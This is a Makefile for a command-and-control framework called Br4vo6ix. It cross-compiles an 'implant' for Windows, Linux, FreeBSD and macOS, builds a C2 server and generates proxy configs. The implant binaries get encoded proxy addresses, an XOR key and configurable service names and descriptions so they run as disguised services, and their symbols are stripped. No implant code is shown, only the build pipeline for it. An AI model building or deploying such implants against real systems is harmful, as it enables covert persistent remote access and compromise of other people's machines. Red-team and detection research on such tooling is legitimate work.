include .env

ENCODED_PROXY_IPS=$(echo $PROXY_IPS | base64)
ENCODED_PROXY_PORTS=$(echo $PROXY_PORTS | base64)

## install: Install all the dependencies
install:
	go get ./...

## windows: Compiles the Br4vo6ix implant for Windows x64
windows:
	GOOS=windows \
	GOARCH=amd64 \
	go build -ldflags=" \
	  -X 'main.ENCODED_PROXY_IPS=$(ENCODED_PROXY_IPS)' \
		-X 'main.ENCODED_PROXY_PORTS=$(PROXY_PORTS)' \
		-X 'main.XOR_KEY=$(XOR_KEY)' \
		-X 'main.SRV_NAME=$(WINDOWS_SRV_NAME)' \
		-X 'main.SRV_DSP_NAME=$(WINDOWS_SRV_NAME)' \
		-X 'main.SRV_DESC=$(WINDOWS_SRV_DESC)' \
		-s -w" -o $(WINDOWS_OUT_FILE) implant/main.go

## linux: Compiles the Br4vo6ix implant for Linux x64
linux:
	GOOS=linux \
	GOARCH=amd64 \
	go build -ldflags=" \
	  -X 'main.ENCODED_PROXY_IPS=$(ENCODED_PROXY_IPS)' \
		-X 'main.ENCODED_PROXY_PORTS=$(PROXY_PORTS)' \
		-X 'main.XOR_KEY=$(XOR_KEY)' \
		-X 'main.SRV_NAME=$(LINUX_SRV_NAME)' \
		-X 'main.SRV_DSP_NAME=$(LINUX_SRV_NAME)' \
		-X 'main.SRV_DESC=$(LINUX_SRV_DESC)' \
		-s -w" -o $(LINUX_OUT_FILE) implant/main.go

## freebsd: Compiles the Br4vo6ix implant for FreeBSD x64
freebsd:
	GOOS=freebsd \
	GOARCH=amd64 \
	go build -ldflags=" \
	  -X 'main.ENCODED_PROXY_IPS=$(ENCODED_PROXY_IPS)' \
		-X 'main.ENCODED_PROXY_PORTS=$(PROXY_PORTS)' \
		-X 'main.XOR_KEY=$(XOR_KEY)' \
		-X 'main.SRV_NAME=$(FREEBSD_SRV_NAME)' \
		-X 'main.SRV_DSP_NAME=$(FREEBSD_SRV_NAME)' \
		-X 'main.SRV_DESC=$(FREEBSD_SRV_DESC)' \
		-s -w" -o $(FREEBSD_OUT_FILE) implant/main.go

## macos: Compiles the Br4vo6ix implant for MacOS x64
macos:
	GOOS=darwin \
	GOARCH=amd64 \
	go build -ldflags=" \
	  -X 'main.ENCODED_PROXY_IPS=$(ENCODED_PROXY_IPS)' \
		-X 'main.ENCODED_PROXY_PORTS=$(PROXY_PORTS)' \
		-X 'main.XOR_KEY=$(XOR_KEY)' \
		-X 'main.SRV_NAME=$(MACOS_SRV_NAME)' \
		-X 'main.SRV_DSP_NAME=$(MACOS_SRV_NAME)' \
		-X 'main.SRV_DESC=$(MACOS_SRV_DESC)' \
		-s -w" -o $(MACOS_OUT_FILE) implant/main.go

## c2: Compiles the Br4vo6ix C2 for use on THIS host
c2:
	go build -o out/server/server server/main.go

## proxy: Generates the config files to run on each proxy server
proxy:
	PROXY_PORTS=$(PROXY_PORTS) PROXY_IPS=$(PROXY_IPS) SERVER_IP=$(SERVER_IP) SERVER_PORT=$(SERVER_PORT) ./proxy.sh
	PROXY_PORTS=$(PROXY_PORTS) PROXY_IPS=$(PROXY_IPS) SERVER_IP=$(SERVER_IP) SERVER_PORT=$(SERVER_PORT) ./unproxy.sh

## all: Compiles the Br4vo6ix implant for all platforms and the C2 for the current host
all: install windows linux freebsd macos c2 proxy
